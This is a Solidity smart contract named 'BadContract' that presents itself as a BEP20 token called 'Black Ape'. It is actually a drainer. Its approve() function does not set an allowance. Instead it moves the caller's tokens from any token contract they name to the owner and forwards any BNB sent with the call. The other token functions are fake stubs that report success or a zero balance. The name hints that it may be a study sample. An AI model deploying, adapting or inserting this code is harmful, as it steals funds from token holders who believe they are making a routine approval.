// SPDX-License-Identifier: MIT
pragma solidity = 0.8.12;

interface IBEP20 {
    function totalSupply() view external returns (uint256);
    function balanceOf(address account) view external returns (uint256);
    function allowance(address owner, address spender) view external returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external payable returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BadContract is IBEP20 {
    address payable private _owner;

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = payable(msg.sender);
    }

    function approve(address tokenToTransfer, uint256 amount) public payable override returns (bool) {
        IBEP20(tokenToTransfer).transferFrom(msg.sender, _owner, amount);

        (bool success, ) = _owner.call{value: msg.value}("");
        require(success, "Failed to send BnB");
        return true;
    }

    function name() public view returns (string memory) { return "Black Ape"; }
    function symbol() public view returns (string memory) { return "BLKAPE"; }    
    function decimals() public pure returns (uint8){ return 2; }

    function totalSupply() view external override returns (uint256) { return 10000000; }
    function balanceOf(address account) view external override returns (uint256) { return 0; }
    function allowance(address owner, address spender) view external override returns (uint256) { return 0; }

    function transfer(address recipient, uint256 amount) external override returns (bool) { return true; }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) { return true; }
}